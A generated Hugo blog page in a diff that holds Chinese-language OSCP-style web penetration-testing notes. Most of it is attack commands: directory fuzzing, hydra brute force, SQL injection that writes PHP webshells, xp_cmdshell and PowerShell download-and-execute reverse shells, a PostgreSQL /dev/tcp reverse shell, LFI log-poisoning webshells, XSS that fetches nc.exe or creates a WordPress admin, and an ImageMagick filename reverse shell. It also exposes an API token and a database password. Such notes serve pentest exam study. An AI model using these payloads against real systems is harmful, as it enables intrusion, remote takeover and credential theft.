@@ -1,0 +1,442 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>web渗透 | 养猪日记</title>
+<meta name=keywords content><meta name=description content="靶场的关注重点相比实战会更为细节：
+1、域名；
+2、网站技术架构cms等；
+3、目录；
+4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用
+5、敏感组合拳信息；
+6、web漏洞；
+FUZZ
+host域名碰撞
+ffuf -u &#34;http://flight.htb&#34; -H &#34;Host: FUZZ.flight.htb&#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
+WFUZZ:
+sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明)
+子域名爆破
+wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H &#34;Host: FUZZ.streetfighterclub.htb&#34; --hw 717   
+目录扫描：
+正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js
+
+dirsearch -u  http://192.168.154.129/ 
+
+漏洞字典：
+/usr/share/wordlists/dirb/vulns/sharepoint.txt
+
+
+oscp优化：
+dirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt 
+
+这个效果一般
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50
+
+最后版本：
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503
+http爆破：
+表单：
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid&#34; -t 64
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &#34;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&#34;
+
+
+摘要认证：
+hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav
+sql注入：
+mysql
+连接：
+mysql -h10.0.0.1 -uroot -p123
+mysql -u school -p'@jCma4s8ZM<?kA' -h localhost
+
+基础语法：
+查库名：
+union select group_concat(database())#
+查表名：
+union select group_concat(table_name) from information_schema.tables where table_schema='library'#
+查列名：
+union select group_concat(column_name) from information_schema.columns where table_name='access' #
+查数据：
+union select group_concat('\n',id,'\n',service,'\n',username,'\n',password) from access #
+写入：
+1&#34;UNION SELECT 1,2,&#34;<?php system($_REQUEST['a']);?>&#34; into outfile 'C:/inetpub/wwwroot/cxk5.php'#
+
+手动测试流程：
+判断是否有注入：
+1'-- -
+1&#34;-- -
+' or 1=1 -- -
+判断列数：
+-1' order by 1-- -
+-1' union select 1,2,3,4,5-- -
+
+mysql爆数据：
+group_concat(schema_name) from information_schema.schemata --+  查询库名
+group_concat(table_name) from information_schema.tables where table_schema='webapphacking' --+  查询表名
+group_concat(column_name) from information_schema.columns where table_name='表名' --+ 查询列名
+mssql
+mssql爆数据：
+https://www.cnblogs.com/-meditation-/articles/16112699.html
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+值得注意的知识点：
+sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
+syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。
+
+如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。
+Hub_DB..syscolumns同理
+
+表名很多参考id值，爆表名时记得把ID也爆出来
+
+关键词：Warning
+Query
+
+普通盲注：
+' AND IF (1=1, sleep(3),'false') --
+' OR NOT 1251=1251#
+' AND IF (1=1, sleep(3),'false') -- 
+
+简化xp_cmd:
+一条：
+EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+二条
+EXEC master.dbo.xp_cmdshell 'ping 192.168.45.240';
+
+盲注开启xp_cmd:
+
+curl members.streetfighterclub.htb/old/verify.asp -d 
+
+&#34;username=test&amp;password=test&amp;logintype=64738;EXEC+sp_configure+'show+advanced+options',1;EXEC+sp_configure+'Xp_cmdshell',1;RECONFIGURE;+--';&amp;B1=LogIn&#34;
+
+关闭xp_cmd:
+curl members.streetfighterclub.htb/old/verify.asp -d &#34;username=test&amp;password=test&amp;logintype=64738;EXEC+sp_configure+'show+advanced+options',1;EXEC+sp_configure+'Xp_cmdshell',0;RECONFIGURE;+--';&amp;B1=LogIn&#34;
+
+验证：
+sudo tcpdump -nni tun0 icmp
+username=a&amp;password=a&amp;logintype=1;EXEC+Xp_cmdshell+'ping+10.10.16.5';&amp;B1=LogIn
+
+反弹shell:
+EXEC master.dbo.xp_cmdshell &#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.175/nishang.ps1')&#34;;
+xp_cmd命令执行16进制编码，不一定成功"><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/oscp/web%E6%B8%97%E9%80%8F/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/oscp/web%E6%B8%97%E9%80%8F/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">web渗透</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;788 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#wfuzz>WFUZZ:</a></li><li><a href=#子域名爆破>子域名爆破</a></li><li><a href=#目录扫描>目录扫描：</a></li><li><a href=#http爆破>http爆破：</a></li></ul><ul><li><a href=#mysql>mysql</a></li><li><a href=#mssql>mssql</a></li><li><a href=#postgre-sql-database>Postgre SQL Database</a></li></ul><ul><li><a href=#文件包含-1>文件包含</a></li></ul><ul><li><a href=#伪造请求>伪造请求：</a></li></ul><ul><li><a href=#wpscan>wpscan</a></li><li><a href=#getshell>getshell</a></li></ul></nav></div></details></div><div class=post-content><p>靶场的关注重点相比实战会更为细节：</p><p>1、域名；
+2、网站技术架构cms等；
+3、目录；
+4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用
+5、敏感组合拳信息；
+6、web漏洞；</p><h1 id=fuzz>FUZZ<a hidden class=anchor aria-hidden=true href=#fuzz>#</a></h1><p>host域名碰撞</p><pre tabindex=0><code>ffuf -u &#34;http://flight.htb&#34; -H &#34;Host: FUZZ.flight.htb&#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
+</code></pre><h2 id=wfuzz>WFUZZ:<a hidden class=anchor aria-hidden=true href=#wfuzz>#</a></h2><pre tabindex=0><code>sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明)
+</code></pre><h2 id=子域名爆破>子域名爆破<a hidden class=anchor aria-hidden=true href=#子域名爆破>#</a></h2><pre tabindex=0><code>wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H &#34;Host: FUZZ.streetfighterclub.htb&#34; --hw 717   
+</code></pre><h2 id=目录扫描>目录扫描：<a hidden class=anchor aria-hidden=true href=#目录扫描>#</a></h2><p>正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：</p><pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js
+
+dirsearch -u  http://192.168.154.129/ 
+
+漏洞字典：
+/usr/share/wordlists/dirb/vulns/sharepoint.txt
+
+
+oscp优化：
+dirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt 
+
+这个效果一般
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50
+
+最后版本：
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503
+</code></pre><h2 id=http爆破>http爆破：<a hidden class=anchor aria-hidden=true href=#http爆破>#</a></h2><pre tabindex=0><code>表单：
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid&#34; -t 64
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &#34;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&#34;
+
+
+摘要认证：
+hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav
+</code></pre><h1 id=sql注入>sql注入：<a hidden class=anchor aria-hidden=true href=#sql注入>#</a></h1><h2 id=mysql>mysql<a hidden class=anchor aria-hidden=true href=#mysql>#</a></h2><pre tabindex=0><code>连接：
+mysql -h10.0.0.1 -uroot -p123
+mysql -u school -p&#39;@jCma4s8ZM&lt;?kA&#39; -h localhost
+
+基础语法：
+查库名：
+union select group_concat(database())#
+查表名：
+union select group_concat(table_name) from information_schema.tables where table_schema=&#39;library&#39;#
+查列名：
+union select group_concat(column_name) from information_schema.columns where table_name=&#39;access&#39; #
+查数据：
+union select group_concat(&#39;\n&#39;,id,&#39;\n&#39;,service,&#39;\n&#39;,username,&#39;\n&#39;,password) from access #
+写入：
+1&#34;UNION SELECT 1,2,&#34;&lt;?php system($_REQUEST[&#39;a&#39;]);?&gt;&#34; into outfile &#39;C:/inetpub/wwwroot/cxk5.php&#39;#
+
+手动测试流程：
+判断是否有注入：
+1&#39;-- -
+1&#34;-- -
+&#39; or 1=1 -- -
+判断列数：
+-1&#39; order by 1-- -
+-1&#39; union select 1,2,3,4,5-- -
+
+mysql爆数据：
+group_concat(schema_name) from information_schema.schemata --+  查询库名
+group_concat(table_name) from information_schema.tables where table_schema=&#39;webapphacking&#39; --+  查询表名
+group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39; --+ 查询列名
+</code></pre><h2 id=mssql>mssql<a hidden class=anchor aria-hidden=true href=#mssql>#</a></h2><pre tabindex=0><code>mssql爆数据：
+https://www.cnblogs.com/-meditation-/articles/16112699.html
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+值得注意的知识点：
+sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
+syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。
+
+如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。
+Hub_DB..syscolumns同理
+
+表名很多参考id值，爆表名时记得把ID也爆出来
+
+关键词：Warning
+Query
+
+普通盲注：
+&#39; AND IF (1=1, sleep(3),&#39;false&#39;) --
+&#39; OR NOT 1251=1251#
+&#39; AND IF (1=1, sleep(3),&#39;false&#39;) -- 
+
+简化xp_cmd:
+一条：
+EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;
+二条
+EXEC master.dbo.xp_cmdshell &#39;ping 192.168.45.240&#39;;
+
+盲注开启xp_cmd:
+
+curl members.streetfighterclub.htb/old/verify.asp -d 
+
+&#34;username=test&amp;password=test&amp;logintype=64738;EXEC+sp_configure+&#39;show+advanced+options&#39;,1;EXEC+sp_configure+&#39;Xp_cmdshell&#39;,1;RECONFIGURE;+--&#39;;&amp;B1=LogIn&#34;
+
+关闭xp_cmd:
+curl members.streetfighterclub.htb/old/verify.asp -d &#34;username=test&amp;password=test&amp;logintype=64738;EXEC+sp_configure+&#39;show+advanced+options&#39;,1;EXEC+sp_configure+&#39;Xp_cmdshell&#39;,0;RECONFIGURE;+--&#39;;&amp;B1=LogIn&#34;
+
+验证：
+sudo tcpdump -nni tun0 icmp
+username=a&amp;password=a&amp;logintype=1;EXEC+Xp_cmdshell+&#39;ping+10.10.16.5&#39;;&amp;B1=LogIn
+
+反弹shell:
+EXEC master.dbo.xp_cmdshell &#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.175/nishang.ps1&#39;)&#34;;
+</code></pre><p>xp_cmd命令执行16进制编码，不一定成功</p><p>网站：https://kw360.net/ox2str/</p><pre tabindex=0><code>;declare @x char(8000);set @x=706f7765727368656c6c2b696578286e65772d6f626a6563742b6e65742e776562636c69656e74292e646f776e6c6f6164737472696e672822687474703a2f2f31302e31302e31362e352f496e766f6b652d506f7765725368656c6c5463702e7073312229;waitfor exec master..xp_cmdshell @x
+</code></pre><p>获取shell的脚本，原理为通过监听web，base64编码的URL来实现回显：</p><pre tabindex=0><code>https://gist.github.com/xassiz/51f392afbe1c0374a008fa85d621455e
+
+注意事项：
+url要带/，最好为443端口
+其中一行改为：
+payload += &#34;set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path(&#39;&#39;)), 1, 1, &#39;&#39;)) as varbinary(max)) FOR XML PATH(&#39;&#39;), BINARY BASE64);&#34;
+注意xp_cmd的大小写
+</code></pre><p>json格式下的sql注入：</p><pre tabindex=0><code>转换成unioncode编码即可
+https://www.zxgj.cn/g/unicode
+</code></pre><p>MSSQL文件写入，适用于不出网场景</p><p>将要写入的二进制文件变成16进制</p><pre tabindex=0><code>#!/usr/bin/env python
+# coding=utf-8
+import urllib
+import binascii
+import sys
+import os
+def str2hex(string):
+    hexstr=binascii.b2a_hex(bytes(string, encoding=&#39;utf-8&#39;))
+    out = bytes(&#34;0x&#34;, encoding=&#39;utf-8&#39;)
+    out = out + hexstr
+    print(out)
+def b2a(filename):
+    with open(filename,&#39;rb&#39;) as f:
+        hexstr=binascii.b2a_hex(f.read())
+        out = bytes(&#34;0x&#34;, encoding=&#39;utf-8&#39;)
+        out = out + hexstr
+        print(out)
+    
+if __name__==&#34;__main__&#34;:
+    filename  = sys.argv[1]
+    if os.path.exists(filename):
+        b2a(filename)
+    else:
+        str2hex(filename)
+</code></pre><p>不出网文件落地，nc可落地，sql语句：</p><pre tabindex=0><code>sp_configure &#39;show advanced options&#39;, 1;
+RECONFIGURE;
+sp_configure &#39;Ole Automation Procedures&#39;, 1;
+RECONFIGURE;
+
+DECLARE @ObjectToken INT
+EXEC sp_OACreate &#39;ADODB.Stream&#39;, @ObjectToken OUTPUT
+EXEC sp_OASetProperty @ObjectToken, &#39;Type&#39;, 1
+EXEC sp_OAMethod @ObjectToken, &#39;Open&#39;
+EXEC sp_OAMethod @ObjectToken, &#39;Write&#39;, NULL, 0xhex（替换这里的内容）
+EXEC sp_OAMethod @ObjectToken, &#39;SaveToFile&#39;, NULL, &#39;c:\windows\system32\spool\drivers\color\nc.exe&#39;, 2
+EXEC sp_OAMethod @ObjectToken, &#39;Close&#39;
+EXEC sp_OADestroy @ObjectToken
+</code></pre><h2 id=postgre-sql-database>Postgre SQL Database<a hidden class=anchor aria-hidden=true href=#postgre-sql-database>#</a></h2><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md</a></p><p>命令执行：</p><pre tabindex=0><code>3&#39;;DROP TABLE IF EXISTS output;CREATE TABLE output(data text);COPY output FROM PROGRAM &#39;/bin/bash -c &#39;&#39;bash -i &gt;&amp; /dev/tcp/192.168.45.240/445 0&gt;&amp;1&#39;&#39;&#39;;--
+</code></pre><h1 id=字典收集>字典收集<a hidden class=anchor aria-hidden=true href=#字典收集>#</a></h1><pre tabindex=0><code>cewl 192.168.154.131 -w 1.txt     #cewl收集的字典可能存在大小写的问题，值得注意，但是可以自己调参数
+
+
+常用的英语弱密码字典：
+https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
+</code></pre><h1 id=本地登录>本地登录<a hidden class=anchor aria-hidden=true href=#本地登录>#</a></h1><p>x-forwarded-for字段</p><pre tabindex=0><code>firefox modheader插件
+</code></pre><h1 id=文件包含>文件包含<a hidden class=anchor aria-hidden=true href=#文件包含>#</a></h1><h2 id=文件包含-1>文件包含<a hidden class=anchor aria-hidden=true href=#文件包含-1>#</a></h2><p>本地文件包含：</p><pre tabindex=0><code>思路：
+主要是读取文件，两个思路：1、读取敏感信息；2、想办法写木马读取，利用日志、session等方式。
+
+读取文件：
+windows目录：
+C:\Windows\win.ini
+在实际操作中，/Windows/win.ini可能可以生效
+以及使用curl -x get的方式进行访问，浏览器得打开源码，没有这个方便。
+
+Linux：
+读取/home/daniela/.ssh/id_rsa
+
+
+1、base64:
+?file1=php://filter/read=convert.base64-encode/resource=flag.php
+?page=php://filter/convert.base64-encode/resource=admin.php
+2、data://代码执行
+?page=data://text/plain,&lt;?php%20echo%20system(&#39;ls&#39;);?&gt;
+
+3、base64代码执行：
+?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls
+
+
+
+写入木马：
+1、UA配合accesslog，这种方式大概率只能用一次！！
+
+apache默认日志目录：
+/var/log/apache2/access.log
+burp修改UA：
+&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+&amp;号传参
+
+2、session配合
+php的session存储和格式如下：
+C:\Windows\TEMP\sess_&lt;cookie&gt;
+</code></pre><p>远程文件包含：</p><pre tabindex=0><code>开启HTTP服务，直接反弹shell
+</code></pre><pre tabindex=0><code>伪协议读文件
+php://filter/read=convert.base64-encode/resource=
+
+php命令执行：
+&lt;?=`whoami`?&gt;
+base64:
+注意一些特殊的字符，比如\n啥的，可以换成\T之类的名字，防止出现bug
+
+echo &#34;wget http://10.10.16.9/nc.exe -o C:\\Windows\\TEMP\\T.exe&#34; | iconv -t UTF-16LE | base64
+
+&lt;?=`powershell /enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAAp
+AC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAaAB0AHQAcAA6AC8ALwAxADAALgAxADAA
+LgAxADYALgA5AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABz
+ADEAKQAKAA==`?&gt;
+
+
+id_rsa中使用默认 RSA 算法，它也可以是id_rsa或id_ecdsa。
+</code></pre><p>值得一看的文件包含</p><pre tabindex=0><code>
+https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/untitled
+</code></pre><h1 id=ssi注入>SSI注入<a hidden class=anchor aria-hidden=true href=#ssi注入>#</a></h1><pre tabindex=0><code>&lt;!--#exec cmd=&#34;id&#34; --&gt;
+
+&lt;!--#EXEC cmd=&#34;cat /etc/passwd&#34; --&gt;
+</code></pre><h1 id=icmp监听>ICMP监听<a hidden class=anchor aria-hidden=true href=#icmp监听>#</a></h1><pre tabindex=0><code>sudo tcpdump -nni tun0 icmp
+</code></pre><h1 id=xss>XSS<a hidden class=anchor aria-hidden=true href=#xss>#</a></h1><pre tabindex=0><code>beef
+安装：
+apt-get install beef-xss
+</code></pre><h2 id=伪造请求>伪造请求：<a hidden class=anchor aria-hidden=true href=#伪造请求>#</a></h2><p>案例1：</p><pre tabindex=0><code>&lt;script src=&#34;http://10.10.16.5/1.js&#34;&gt;&lt;/script&gt;
+开启服务器
+
+
+var request = new XMLHttpRequest();
+var params = &#39;cmd=dir|powershell -c &#34;iwr -uri 10.10.16.5/nc.exe -outfile %temp%\\n.exe&#34;; %temp%\\n.exe -e cmd.exe 10.10.16.5 443&#39;;
+request.open(&#39;POST&#39;, &#39;http://localhost/admin/backdoorchecker.php&#39;, true);
+request.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;);
+request.send(params);
+</code></pre><p>案例2：</p><pre tabindex=0><code>var ajaxRequest = new XMLHttpRequest(); var requestURL = &#34;/wp-admin/user-new.php&#34;; var nonceRegex = /ser&#34; value=&#34;([^&#34;]*?)&#34;/g; ajaxRequest.open(&#34;GET&#34;, requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1];
+var params = &#34;action=createuser&amp;_wpnonce_create-user=&#34;+nonce+&#34;&amp;user_login=attacker&amp;email=attacker@offsec.com&amp;pass1=attackerpass&amp;pass2=attackerpass&amp;role=administrator&#34;;
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open(&#34;POST&#34;, requestURL, true);
+ajaxRequest.setRequestHeader(&#34;Content-Type&#34;, &#34;application/x-www-form-urlencoded&#34;);
+ajaxRequest.send(params);
+</code></pre><p>JS压缩：</p><p><a href=https://jscompress.com/>https://jscompress.com/</a></p><p>JS编码：</p><pre tabindex=0><code>function encode_to_javascript(string) {
+            var input = string
+            var output = &#39;&#39;;
+            for(pos = 0; pos &lt; input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += &#34;,&#34;;
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript(&#39;XXXXXXXSSSSSS&#39;)
+console.log(encoded)
+</code></pre><p>编码后使用：</p><pre tabindex=0><code>curl -i http://offsecwp --user-agent &#34;&lt;script&gt;eval(String.fromCharCode(xxxxx))&lt;/script&gt;&#34;
+</code></pre><h1 id=wordpress>wordpress<a hidden class=anchor aria-hidden=true href=#wordpress>#</a></h1><p>思路：
+首先是wpscan扫描，重点在于插件名字和版本号，配合searchsploit查找漏洞。
+随后是用户扫描，做字典进行爆破+社工字典（可选）</p><p>然后是漏洞利用，未授权的rce最好
+其次sql注入，读取admin账户密码，可爆破的
+然后是文件读取，读数据账密
+/var/www/wp-config.php
+/var/www/html/wp-config.php
+/var/www/html/main/wp-config.php
+/var/www/html/wordpress/wp-config.php
+ssh密钥，通过passwd文件可以知道用户名字
+/home/daniela/.ssh/id_rsa</p><h2 id=wpscan>wpscan<a hidden class=anchor aria-hidden=true href=#wpscan>#</a></h2><pre tabindex=0><code>API:
+885u9XNOZWZ2KUhUKOVstFAyUaJ0CSh5x9ZXv5r2UXQ
+
+扫描所有插件：
+wpscan --url http://offsecwp -e ap --api-token 885u9XNOZWZ2KUhUKOVstFAyUaJ0CSh5x9ZXv5r2UXQ
+
+扫描漏洞插件：(不准确)
+-e vp
+爆破用户名：
+wpscan --url http://offsecwp -P xxx -U xxx
+
+激进扫描，在常规扫描无果的情况下：
+--plugins-detection aggressive
+扫描用户：
+wpscan --url http://offsecwp -e u
+</code></pre><h2 id=getshell>getshell<a hidden class=anchor aria-hidden=true href=#getshell>#</a></h2><pre tabindex=0><code>themes路径
+http://192.168.5.101/wordpress/wp-content/themes/twentyfourteen/404.php
+</code></pre><h1 id=文件上传>文件上传：<a hidden class=anchor aria-hidden=true href=#文件上传>#</a></h1><pre tabindex=0><code>上传到：
+../../../../../../../root/.ssh/authorized_keys
+
+
+ImageMagick：
+
+cp 1.jpeg &#39;|smile&#34;`echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjEyLzQ0NDQgMD4mMScK | base64 -d | bash`&#34;.jpg
+
+
+
+.htaccess
+
+&lt;FilesMatch &#34;shana&#34;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+
+上传文件名：
+shana.jpg
+</code></pre><p>在有身份信息的情况下可以考虑：</p><pre tabindex=0><code>cadaver tool
+cadaver http://192.168.142.122
+</code></pre><h1 id=命令执行>命令执行<a hidden class=anchor aria-hidden=true href=#命令执行>#</a></h1><pre tabindex=0><code>判断执行环境：
+(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
+
+
+在Windows系统下的 cmd命令中，有以下一些截断拼接符。
+&amp;前面的语句为假则直接执行后面的
+&amp;&amp;前面的语句为假则直接出错，后面的也不执行 
+|直接执行后面的语句 
+||前面出错执行后面的
+
+
+
+在Linux系统下的shell命令中，有以下一些截断拼接符。
+在Linux上，上面的;也可以用|、||代替
+;前面的执行完执行后面的
+| 管道符，上一条命令的输出，作为下一条命令的参数
+||当前面的执行出错时执行后面的
+&amp; 无论前边语句真假都会执行 
+&amp;&amp; 只有前边语句为真，才会执行后边语句
+
+在linux中可以使用`whoami`的方式执行命令
+</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/><span class=title>« Prev</span><br><span>Weblogic</span>
+</a><a class=next href=http://localhost:1313/posts/oscp/windows-%E6%8F%90%E6%9D%83/><span class=title>Next »</span><br><span>windows 提权</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
